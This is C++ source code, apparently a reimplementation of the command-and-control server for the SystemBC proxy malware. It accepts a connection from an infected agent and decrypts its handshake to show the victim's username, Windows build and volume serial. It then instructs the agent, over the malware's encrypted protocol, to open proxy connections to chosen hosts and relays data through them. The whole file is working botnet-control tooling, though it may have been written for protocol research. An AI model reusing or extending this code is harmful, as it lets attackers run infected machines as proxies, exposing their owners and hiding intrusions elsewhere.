#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <cstdint>

#pragma pack(push, 1)
#pragma comment(lib, "Ws2_32.lib")

enum address_type_t : uint8_t
{
	IPv4 = 1,
	Domain = 3,
	IPv6 = 4,
};

struct packet_header_t
{
	union
	{
		struct
		{
			bool established_connection;
			uint8_t connection_id;
		};

		uint16_t value;
	};

	uint16_t length;
};

struct data_packet_t
{
	packet_header_t header;
	uint8_t data[1];
};

struct data_packet_response_header_t
{
	uint8_t connection_id;
	uint16_t length;
};

struct data_packet_response_t
{
	data_packet_response_header_t header;
	uint8_t data[1];
};

struct file_download_response_t
{
	uint8_t magic;
	uint16_t length;
	uint32_t file_download_id;
};

struct control_packet_t
{
	packet_header_t header;

	union
	{
		struct
		{
			uint32_t file_download_id;
		};

		struct
		{
			uint8_t _[3];
			address_type_t addr_type;
		};
	};

	union
	{
		struct
		{
			uint8_t url[1];
		} file_download;

		// New Proxy connection passing domain name
		struct
		{
			uint8_t domain_name_len;
			uint8_t domain[1];
		} domain_connect;

		// New Proxy connection passing IPv4 Address
		struct
		{
			uint32_t ipv4;
			uint16_t port;
		} ip4_connect;

		// New Proxy connection passing IPv6 Address
		struct
		{
			uint8_t ipv6[16];
			uint16_t port;
		} ip6_connect;
	} payload;
};

struct hello_packet_t
{
	uint8_t xor_key[50];
	char windows_build_number[3];
	bool is_wow64;
	char username[41 + 1];
	uint32_t volume_serial_number;
};

struct systembc_context_t
{
	SOCKET channel;
	SOCKET connections[200];
};

typedef uint8_t connid_t;
uint8_t g_xor_key[50] = { 0 };

template <typename T>
__forceinline
void swap(T& a, T& b)
{
	T t = a;
	a = b;
	b = t;
}

void hex_dump(uint8_t* data, size_t size, bool hex_stream = false)
{
	if (hex_stream)
	{
		for (size_t i = 0; i < size; i++)
		{
			printf("%02X", data[i]);
		}
	}
	else
	{
		for (size_t i = 0; i < size; i += 16)
		{
			for (size_t j = 0; i + j < size && j < 16; j++)
			{
				printf("%02X ", data[i + j]);
			}

			printf("     ");

			for (size_t j = 0; i + j < size && j < 16; j++)
			{
				if (data[i + j] >= 32 && data[i + j] <= 126)
				{
					printf("%c", data[i + j]);
				}
				else
				{
					printf(".");
				}
			}

			puts("");
		}
	}
}

int sendall(SOCKET socket, char* data, int length)
{
	size_t sent = 0;

	while (sent < length)
	{
		int n = send(socket, &data[sent], length - sent, 0);
		
		if (n <= 0)
		{
			break;
		}

		sent += n;
	}

	return sent;
}

int recvall(SOCKET socket, char* data, int length)
{
	size_t recvd = 0;

	while (recvd < length)
	{
		int n = recv(socket, &data[recvd], length - recvd, 0);
		
		if (n <= 0)
		{
			break;
		}

		recvd += n;
	}

	return recvd;
}

void systembc_crypto(uint8_t* key, size_t key_size, uint8_t* data, size_t data_size)
{
	uint32_t a = 0xFFFEFDFC;
	uint8_t state[256] = { 0 };

	for (int i = 63; i >= 0; i--)
	{
		((uint32_t*)state)[i] = a;
		a -= 0x4040404;
	}

	uint8_t b = 0;
	for (size_t i = 0, j = 0; i < 256; i++, j++)
	{
		b += state[i] + key[j % key_size];
		swap(state[b], state[i]);
	}

	// This should have been done earlier Mr. Hacker
	if (!data_size)
	{
		return;
	}

	uint8_t x = 0;
	uint8_t y = 1;
	for (size_t i = 0; i < data_size; i++)
	{
		x += state[y];
		uint8_t kb = state[x] + state[y];
		data[i] ^= state[kb];
		swap(state[x], state[y]);
		y += 1;
	}
}

bool systembc_connect(int port, systembc_context_t& systembc_context)
{
	WSADATA wsa;

	if (WSAStartup(MAKEWORD(2, 2), &wsa))
	{
		return false;
	}

	SOCKET socket = ::socket(AF_INET, SOCK_STREAM, 0);
	if (socket == SOCKET_ERROR)
	{
		return false;
	}

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(port);

	if (bind(socket, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
	{
		return false;
	}

	if (listen(socket, 1) == SOCKET_ERROR)
	{
		return false;
	}

	struct sockaddr_in client_addr;
	int client_len = sizeof(client_addr);
	SOCKET client = accept(socket, (struct sockaddr*)&client_addr, &client_len);

	hello_packet_t hello_packet;
	size_t recvd = 0;

	while (recvd < sizeof(hello_packet))
	{
		int n = recv(client, (char*)&hello_packet + recvd, sizeof(hello_packet_t) - recvd, 0);
		
		if (n <= 0)
		{
			break;
		}

		recvd += n;
	}

	systembc_crypto(hello_packet.xor_key, sizeof hello_packet.xor_key, (uint8_t*)&hello_packet + sizeof(hello_packet.xor_key), sizeof(hello_packet) - sizeof(hello_packet.xor_key));

	printf("Connected To Agent (32-bit: %s)\n", hello_packet.is_wow64 ? "yes" : "no");
	printf("Username: %s\n", hello_packet.username);
	printf("Windows Build Number: %d%d%d\n\n", hello_packet.windows_build_number[2], hello_packet.windows_build_number[1], hello_packet.windows_build_number[0]);
	puts("Session Key: ");
	hex_dump(hello_packet.xor_key, sizeof hello_packet.xor_key);
	puts("");
	printf("Volume Serial Number: %llX\n", hello_packet.volume_serial_number);

	memcpy(g_xor_key, hello_packet.xor_key, sizeof hello_packet.xor_key);

	systembc_context.channel = client;
	return true;
}

connid_t systembc_new_connection(systembc_context_t& systembc_context, const char* host, address_type_t address_type, int port)
{
	static uint8_t connection_id = 0;
	
	if (connection_id == 199)
	{
		return -1;
	}

	uint8_t next_connection_id = ++connection_id;
	control_packet_t* control_packet = (control_packet_t * )calloc(sizeof(control_packet_t) + 512, 1);
	control_packet->header.established_connection = false;
	control_packet->addr_type = address_type;
	control_packet->header.connection_id = next_connection_id;
	control_packet->header.length = sizeof(control_packet->_) + sizeof(control_packet->addr_type);

	switch (address_type)
	{
	case address_type_t::IPv4:
	{
		if (inet_pton(AF_INET, host, &control_packet->payload.ip4_connect.ipv4) <= 0)
		{
			return -1;
		}

		control_packet->header.length += sizeof(control_packet->payload.ip4_connect);
		control_packet->payload.ip4_connect.port = htons(port);
	} break;

	case address_type_t::IPv6: 
	{
		if (inet_pton(AF_INET6, host, control_packet->payload.ip6_connect.ipv6) <= 0)
		{
			return -1;
		}

		control_packet->header.length += sizeof(control_packet->payload.ip6_connect);
		control_packet->payload.ip6_connect.port = htons(port);
	} break;

	case address_type_t::Domain:
	{
		int domain_name_len = strlen(host);
		memcpy(control_packet->payload.domain_connect.domain, host, domain_name_len);
		control_packet->header.length += sizeof(control_packet->payload.domain_connect) + domain_name_len;
		control_packet->payload.domain_connect.domain_name_len = domain_name_len;
	} break;

	default:
	{
		return -1;
	}
	}

	int length = control_packet->header.length;
	systembc_crypto(g_xor_key, sizeof g_xor_key, (uint8_t*)control_packet, sizeof(packet_header_t));
	systembc_crypto(g_xor_key, sizeof g_xor_key, (uint8_t*)control_packet + sizeof(packet_header_t), length);
	sendall(systembc_context.channel, (char*)control_packet, sizeof(packet_header_t) + length);

	free(control_packet);

	uint8_t connection_confirmation_packet[] = {
		next_connection_id,
		0x0A, 0x00,
		0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 
	};

	uint8_t buf[sizeof(connection_confirmation_packet)] = { 0 };
	recvall(systembc_context.channel, (char*)buf, sizeof(connection_confirmation_packet));
	systembc_crypto(g_xor_key, sizeof g_xor_key, (uint8_t*)buf, 3);
	systembc_crypto(g_xor_key, sizeof g_xor_key, (uint8_t*)buf + 3, 10);

	if (memcmp(buf, connection_confirmation_packet, sizeof(connection_confirmation_packet)) != 0)
	{
		printf("Failed to connect to %s:%d\n", host, port);
		--connection_id;
		return -1;
	}

	printf("New Connection on %s:%d\n", host, port);
	return next_connection_id;
}

bool systembc_send(systembc_context_t& systembc_context, connid_t connid, char* data, int length)
{
	data_packet_t* data_pckt = (data_packet_t * )calloc(sizeof(data_packet_t) + length, 1);
	data_pckt->header.established_connection = true;
	data_pckt->header.connection_id = connid;
	data_pckt->header.length = length;
	memcpy((char*)data_pckt->data, data, length);

	systembc_crypto(g_xor_key, sizeof g_xor_key, (uint8_t*)data_pckt + sizeof(data_pckt->header), length);
	systembc_crypto(g_xor_key, sizeof g_xor_key, (uint8_t*)data_pckt, sizeof(data_pckt->header));

	int result = sendall(systembc_context.channel, (char*)data_pckt, sizeof(data_packet_t) + length);
	free(data_pckt);
	return result;
}

int systembc_recv(systembc_context_t& systembc_context, connid_t connid, char** data)
{
	data_packet_response_header_t header{};
	recvall(systembc_context.channel, (char*) & header, sizeof(header));
	systembc_crypto(g_xor_key, sizeof g_xor_key, (uint8_t*)&header, sizeof(header));
	*data = (char*)calloc(header.length, 1);
	int n = recvall(systembc_context.channel, *data, header.length);
	systembc_crypto(g_xor_key, sizeof g_xor_key, (uint8_t*)*data, header.length);
	return n;
}

int main()
{
	puts("Listening ...");

	systembc_context_t systembc_context{};
	systembc_connect(4001, systembc_context);
	connid_t connid = systembc_new_connection(systembc_context, "127.0.0.1", address_type_t::IPv4, 1337);

	char msg[] = "Hello World";
	systembc_send(systembc_context, connid, msg, sizeof(msg));

	char* buf = nullptr; 
	systembc_recv(systembc_context, connid, &buf);

	printf("%s\n", buf);
}